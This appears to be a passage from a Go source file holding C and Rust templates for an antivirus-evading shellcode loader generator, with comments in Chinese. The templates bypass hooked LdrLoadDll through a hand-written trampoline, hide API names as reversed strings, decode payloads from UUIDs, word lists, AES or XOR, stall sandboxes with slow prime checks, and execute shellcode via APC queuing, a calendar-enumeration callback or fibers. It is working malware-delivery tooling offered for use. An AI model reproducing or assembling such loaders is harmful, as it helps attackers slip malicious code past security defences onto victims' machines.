	unsigned char jumpAddress[] = { 0x65, 0x72, 0x45, 0x77 };
	unsigned char jumpEpilogue[] = { 0xFF, 0xE0, 0xC3 };
	*(void**)(jumpAddress) = jmpAddr;

	CCopyMemory(trampoline, (PVOID)"\x89\xFF", 2);
	CCopyMemory((PBYTE)trampoline + 2, jumpPrelude, sizeof jumpPrelude);
	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude, jumpAddress, sizeof jumpAddress);
	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude + sizeof jumpAddress, jumpEpilogue, sizeof jumpEpilogue);
	DWORD oldProtect1 = 0;
	MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
	LdrLoadrDll = (pNewLdrLoadDll)trampoline;


#endif
    ;
    //Loading dll
    HANDLE User32module = NULL;
    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
    HANDLE kernel32module = NULL;
    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
    HANDLE ntdllmodule = NULL;
    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
    typedef HMODULE(WINAPI* pGetModuleHandleA)(
            LPCSTR lpModuleName
    );
    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);

    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);

    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);


    char write_process_memory[] = { 'y', 'r', 'o', 'm', 'e', 'M', 's', 's', 'e', 'c', 'o', 'r', 'P', 'e', 't', 'i', 'r', 'W', '\0'};
    reverseString(write_process_memory);
    typedef BOOL(WINAPI* pWriteProcessMemory)(
            HANDLE hProcess,
            LPVOID lpBaseAddress,
            LPCVOID lpBuffer,
            SIZE_T nSize,
            SIZE_T* lpNumberOfBytesWritten
    );

    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);

    char get_current_process[] = { 's', 's', 'e', 'c', 'o', 'r', 'P', 't', 'n', 'e', 'r', 'r', 'u', 'C', 't', 'e', 'G', '\0' };
    reverseString(get_current_process);
    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);
    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);

	REPLACR_OBFUSCATION

	unsigned char key[] = "%s";
    unsigned int key_len = sizeof(key);
    My_Xor((char*)xpp, length, (char*)key, key_len);

	SIZE_T allocationSize = length;
	void* addr = NULL;

	REPLACE_Loading_Technique

    return 0;

}
`

// rust 反沙箱
var __rust__sandbox = `
	is_prime(1000000000000002493);
	is_prime(1000000000000002481);
	is_prime(1000000000000002319);
	is_prime(1000000000000002271);
	is_prime(1000000000000002217);
	is_prime(1000000000000002137);
	is_prime(1000000000000002097);
	is_prime(1000000000000002049);
	is_prime(1000000000000001953);
	is_prime(1000000000000002481);
`

// rust 解混淆
var __rust__uuid = `
	let uuids: Vec<&str> = vec![ %s ];
	let mut shellcode_result = deobfuscate_uuid(uuids);
	let mut shellcode = match shellcode_result {
	   Ok(bytes) => bytes,
	   Err(_) => {
		   println!("Failed to deobfuscate UUIDs");
		   return;
	   }
	};
`

var __rust__words = `
	let dataset:Vec<&str>=vec![ %s ];
	let words:Vec<&str>=vec![ %s ];
	let mut shellcode=deobfuscate_words(words,dataset);
`

// rust 解密
var __rust__aes = `
	let key = b"%s";
	let iv = b"%s";
	let cipher = Cipher::new_128(key);

	let shellcode = cipher.cbc_decrypt(iv, &*shellcode);
`
var __rust__xor = `
	let key = b"%s";
	my_xor(&mut shellcode, key);
`

// rust加载方式模板
var __rust__unhook__earlybird = `
        //get ntdll.dll
        // Convert DLL name to wide string
        let ntdll_name: Vec<u16> = OsString::from("ntdll.dll")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        // Prepare UNICODE_STRING for DLL name
        let mut ntdll_unicode = UNICODE_STRING {
            Length: ((ntdll_name.len() - 1) * 2) as u16,
            MaximumLength: (ntdll_name.len() * 2) as u16,
            Buffer: ntdll_name.as_ptr() as *mut _,
        };
        // let mut kernel_dll_unicode =prepare_unicode_string("kernel32.dll");
        let mut ntdllhandle = null_mut();
        let _ = ldr_loadr_dll(ptr::null_mut(), 0 as PULONG, &mut ntdll_unicode, &mut ntdllhandle);
        let ntdllhandle: HMODULE = transmute(ntdllhandle);
        //get NtTestAlert
        type PMyNtTestAlert=unsafe extern "system" fn();
        let my_nt_test_alert_addr = my_get_proc_address(ntdllhandle, s!("NtTestAlert"));
        let my_nt_test_alert:PMyNtTestAlert= transmute(my_nt_test_alert_addr);

        //get GetCurrentThread
        type PMyGetCurrentThread=unsafe extern "system" fn() -> HANDLE;
        let my_get_current_thread_addr = my_get_proc_address(kernel32handle, s!("GetCurrentThread"));
        let my_get_current_thread:PMyGetCurrentThread= transmute(my_get_current_thread_addr);

        //get QueueUserAPC
        type PMyQueueUserAPC=unsafe extern "system" fn(
            pfnAPC: PAPCFUNC,
            hThread: HANDLE,
            dwData: usize
        ) -> usize;
        let my_queue_user_apcaddr = my_get_proc_address(kernel32handle, s!("QueueUserAPC"));
        let my_queue_user_apc:PMyQueueUserAPC=transmute(my_queue_user_apcaddr);
        
        let address = my_virtual_alloc(NULL,shellcode.len(),MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        is_prime(1000000000000002049);
        let mut old_protect:u32 =0;
        my_virtual_protect(address, shellcode.len(), 0x20, &mut old_protect);
        is_prime(1000000000000002137);
        my_virtual_protect(address, shellcode.len(), 0x40, &mut old_protect);
        is_prime(1000000000000002481);
        my_write_process_memory(my_get_current_process(),address,shellcode.as_ptr()  as LPCVOID,shellcode.len(),null_mut());

        my_queue_user_apc(transmute(address), my_get_current_thread(), 0);
        my_nt_test_alert();
`

var __rust__unhook__callback = `
        // 回调函数加载shellcdoe
        //get EnumCalendarInfoA
        type PMyEnumCalendarInfoA = unsafe extern "system" fn(
            lpCalInfoEnumProc: CALINFO_ENUMPROCA,
            Locale: LCID,
            Calendar: CALID,
            CalType: CALTYPE,
        ) -> BOOL;
        let my_enum_calendar_infoa_addr = my_get_proc_address(kernel32handle, s!("EnumCalendarInfoA"));
        let my_enum_calendar_infoa :PMyEnumCalendarInfoA= transmute(my_enum_calendar_infoa_addr);

		let address = my_virtual_alloc(NULL,shellcode.len(),MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        is_prime(1000000000000002049);
        let mut old_protect:u32 =0;
        my_virtual_protect(address, shellcode.len(), 0x20, &mut old_protect);
        is_prime(1000000000000002137);
        my_virtual_protect(address, shellcode.len(), 0x40, &mut old_protect);
        is_prime(1000000000000002481);
        my_write_process_memory(my_get_current_process(),address,shellcode.as_ptr()  as LPCVOID,shellcode.len(),null_mut());

        my_enum_calendar_infoa(transmute(address), LOCALE_USER_DEFAULT, 1, 1);
`

var __rust__unhook__fiber = `
        // 转换纤程加载shellcode
        //get ConvertThreadToFiber
        type PMyConvertThreadToFiber = unsafe extern "system" fn(
            lpparameter: LPVOID
        ) -> LPVOID;
        let my_convert_thread_to_fiber_addr = my_get_proc_address(kernel32handle,s!("ConvertThreadToFiber"));
        let my_convert_thread_to_fiber:PMyConvertThreadToFiber = std::mem::transmute(my_convert_thread_to_fiber_addr);
        
        //get CreateFiber
        type PMyCreateFiber = unsafe extern "system" fn(
            dw_stack_size: usize,
            lp_start_address: LPFIBER_START_ROUTINE,
            lp_parameter: *const ::core::ffi::c_void
        ) -> LPVOID;
        let my_create_fiber_addr = my_get_proc_address(kernel32handle,s!("CreateFiber"));
        let my_create_fiber:PMyCreateFiber=transmute(my_create_fiber_addr);
        
        //get SwitchToFiber
        type PMySwitchToFiber = unsafe extern "system" fn(lp_fiber: LPVOID);
        let my_switch_to_fiber_addr = my_get_proc_address(kernel32handle,s!("SwitchToFiber"));
        let my_switch_to_fiber:PMySwitchToFiber = std::mem::transmute(my_switch_to_fiber_addr);

		let address = my_virtual_alloc(NULL,shellcode.len(),MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        is_prime(1000000000000002049);
        let mut old_protect:u32 =0;
        my_virtual_protect(address, shellcode.len(), 0x20, &mut old_protect);
        is_prime(1000000000000002137);
        my_virtual_protect(address, shellcode.len(), 0x40, &mut old_protect);
        is_prime(1000000000000002481);
        my_write_process_memory(my_get_current_process(),address,shellcode.as_ptr()  as LPCVOID,shellcode.len(),null_mut());

        let main_fiber = my_convert_thread_to_fiber(NULL);
        let func = transmute(address);
        let shellcode_fiber =my_create_fiber(0, func, null());
        
        my_switch_to_fiber(shellcode_fiber);
        my_switch_to_fiber(main_fiber);
`

var __rust__unhook = `
#![windows_subsystem = "windows"]

use std::ffi::{c_char, c_void, CString, OsString};
use std::mem::transmute;
use std::os::windows::ffi::OsStrExt;
use std::{mem, ptr, slice};
use std::alloc::{alloc, dealloc, Layout};
use std::ptr::{null, null_mut};
use uuid::Uuid;
use libaes::Cipher;

use winapi::shared::minwindef::{LPCVOID, LPVOID};
use winapi::shared::ntdef::{LCID, LOCALE_USER_DEFAULT, NTSTATUS, NULL, PULONG, PUNICODE_STRING, PVOID, UNICODE_STRING, WCHAR};
use winapi::um::winnls::{CALID, CALINFO_ENUMPROCA, CALTYPE};
use winapi::um::winbase::LPFIBER_START_ROUTINE;
use windows::core::{PCSTR, s};
use windows::core::imp::BOOL;
use windows::Win32::Foundation::{HANDLE, HMODULE, PAPCFUNC};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE, VirtualAlloc, VirtualProtect};

pub type PWSTR = *mut WCHAR;


fn prepare_unicode_string(input: &str) -> UNICODE_STRING {
    // Convert DLL name to wide string
    let wide_string: Vec<u16> = OsString::from(input)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    // Prepare UNICODE_STRING for DLL name
    UNICODE_STRING {
        Length: ((wide_string.len() - 1) * 2) as u16,
        MaximumLength: (wide_string.len() * 2) as u16,
        Buffer: wide_string.as_ptr() as *mut _,
    }
}


unsafe fn copy_memory(destination: *mut u8, source: *const u8, length: usize) {
    let mut d = destination;
    let mut s = source;

    for _ in 0..length {
        *d = *s;
        d = d.add(1);
        s = s.add(1);
    }
}

pub fn deobfuscate_uuid(list_uuid: Vec<&str>) -> Result<Vec<u8>, ()> {
    let mut desofuscated_bytes = Vec::new();

    for uuid_str in list_uuid {
        match Uuid::parse_str(uuid_str) {
            Ok(uuid) => {
                desofuscated_bytes.extend_from_slice(uuid.as_bytes());
            }
            Err(_) => return Err(()),
        }
    }

    Ok(desofuscated_bytes)
}


type PNewLdrLoadDll = unsafe extern "system" fn(
    dll_path: PWSTR,
    dll_characteristics: PULONG,
    dll_name: PUNICODE_STRING,
    dll_handle: *mut PVOID,
) -> NTSTATUS;

fn deobfuscate_words(words: Vec<&str>, dataset: Vec<&str>) -> Vec<u8> {
    let mut shellcode: Vec<u8> = vec![0; words.len()];
    for sc_index in 0..shellcode.len() {
        for tt_index in 0..256 {
            if dataset[tt_index] == words[sc_index] {
                shellcode[sc_index] = tt_index as u8;
                break;
            }
        }
    }
    shellcode
}

fn my_xor(data: &mut [u8], key: &[u8]) {
    for i in 0..data.len() {
        data[i] ^= key[i %% key.len()];
    }
}

fn is_prime(n: i64) -> bool {
    if n <= 1 {
        return false;
    }
    for i in 2..=n {
        if i * i > n {
            break;
        }
        if n %% i == 0 {
            return false;
        }
    }
    true
}


fn main() {
	REPLACE_ANTI_SANDBOX
    let hmodule = unsafe { LoadLibraryA(s!("ntdll.dll")).unwrap() };
    let orign_ldr_load_dll = unsafe { GetProcAddress(hmodule, s!("LdrLoadDll")).unwrap() };
    let mut ldr_loadr_dll: PNewLdrLoadDll = unsafe { transmute(null::<fn()>()) };


    #[cfg(target_arch = "x86_64")] {
        let jmp_addr: *const () = (orign_ldr_load_dll as usize + 0x5) as *const ();
        let orgin: [u8; 5] = [0x48, 0x89, 0x5c, 0x24, 0x10];
        let jump_prelude: [u8; 2] = [0x49, 0xBB];
        let jump_epilogue: [u8; 4] = [0x41, 0xFF, 0xE3, 0xC3];
        let trampoline = unsafe {
            VirtualAlloc(None, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
        };
        unsafe{
            let addr_ptr: *const u8 = std::ptr::addr_of!(jmp_addr) as *const u8;
            copy_memory(trampoline as *mut u8, orgin.as_ptr(), 5);
            copy_memory(trampoline.add(5) as *mut u8, jump_prelude.as_ptr(), jump_prelude.len());
            copy_memory(trampoline.add(5).add(2) as *mut u8, addr_ptr, 8);
            copy_memory(trampoline.add(5).add(2).add(8) as *mut u8, jump_epilogue.as_ptr(), 4);
            let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(trampoline, 30, PAGE_EXECUTE_READ, &mut oldprotect).expect("TODO: panic message");
            ldr_loadr_dll = std::mem::transmute(trampoline);
        }
    }
    #[cfg(target_arch = "x86")]{
        let jmp_addr: *const () = (orign_ldr_load_dll as usize + 0x2) as *const ();
        let orgin: [u8; 2] = [0x89,0xFF];
        let jump_prelude: [u8; 1] = [0xB8];
        let jump_epilogue: [u8; 3] = [0xFF, 0xE0, 0xC3];
        let trampoline = unsafe {
            VirtualAlloc(None, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
        };
        unsafe{
            let addr_ptr: *const u8 = std::ptr::addr_of!(jmp_addr) as *const u8;
            crate::copy_memory(trampoline as *mut u8, orgin.as_ptr(), 2);
            crate::copy_memory(trampoline.add(2) as *mut u8, jump_prelude.as_ptr(), jump_prelude.len());
            crate::copy_memory(trampoline.add(2).add(jump_prelude.len()) as *mut u8, addr_ptr, 4);
            crate::copy_memory(trampoline.add(2).add(jump_prelude.len()).add(4) as *mut u8, jump_epilogue.as_ptr(), jump_epilogue.len());
            let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(trampoline, 30, PAGE_EXECUTE_READ, &mut oldprotect).expect("TODO: panic message");
            ldr_loadr_dll = std::mem::transmute(trampoline);
        }
    }

    unsafe {


        //get kernel32.dll
        // Convert DLL name to wide string
        let kernel32_dll_name: Vec<u16> = OsString::from("kernel32.dll")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        // Prepare UNICODE_STRING for DLL name
        let mut kernel_dll_unicode = UNICODE_STRING {
            Length: ((kernel32_dll_name.len() - 1) * 2) as u16,
            MaximumLength: (kernel32_dll_name.len() * 2) as u16,
            Buffer: kernel32_dll_name.as_ptr() as *mut _,
        };
        // let mut kernel_dll_unicode =prepare_unicode_string("kernel32.dll");
        let mut kernel32handle = null_mut();
        let _ = ldr_loadr_dll(ptr::null_mut(), 0 as PULONG, &mut kernel_dll_unicode, &mut kernel32handle);
        let kernel32handle: HMODULE = std::mem::transmute(kernel32handle);
        //get my_get_proc_address
        type PMyGetProcAddress = unsafe extern "system" fn(HMODULE, PCSTR) -> LPVOID;
        let my_get_proc_address_addr = GetProcAddress(kernel32handle, s!("GetProcAddress")).unwrap();
        let my_get_proc_address: PMyGetProcAddress = transmute(my_get_proc_address_addr);

        //get VirtualAlloc
        type PMyVirtualAlloc = unsafe extern "system" fn(
            lpaddress: LPVOID,
            dwsize: usize,
            flallocationtype: VIRTUAL_ALLOCATION_TYPE,
            flprotect: PAGE_PROTECTION_FLAGS,
        ) -> LPVOID;
        let my_virtual_alloc_addr = my_get_proc_address(kernel32handle, s!("VirtualAlloc"));
        let my_virtual_alloc: PMyVirtualAlloc = transmute(my_virtual_alloc_addr);

        //get VirtualProtect
        type PMyVirtualProtect = unsafe extern "system" fn(
            lpaddress: PVOID,
            dwsize: usize,
            flnewprotect: u32,
            lpfloldprotect: *mut u32,
        ) -> BOOL;
        let my_virtual_protect_addr = my_get_proc_address(kernel32handle, s!("VirtualProtect"));
        let my_virtual_protect: PMyVirtualProtect = transmute(my_virtual_protect_addr);

        //get WriteProcessMemory
        type PMyWriteProcessMemory = unsafe extern "system" fn(
            hprocess: HANDLE,
            lpbaseaddress: LPCVOID,
            lpbuffer: LPCVOID,
            nsize: usize,
            lpnumberofbyteswritten: *mut usize,
        ) -> BOOL;
        let my_write_process_memory_addr = my_get_proc_address(kernel32handle, s!("WriteProcessMemory"));
        let my_write_process_memory: PMyWriteProcessMemory = transmute(my_write_process_memory_addr);

        //get GetCurrentProcess
        type PMyGetCurrentProcess = unsafe extern "system" fn() -> HANDLE;
        let my_get_current_process_addr = my_get_proc_address(kernel32handle, s!("GetCurrentProcess"));
        let my_get_current_process: PMyGetCurrentProcess = transmute(my_get_current_process_addr);

		REPLACR_OBFUSCATION

		REPLACR_DECRYPT

		REPLACE_Loading_Technique
    };
}

`
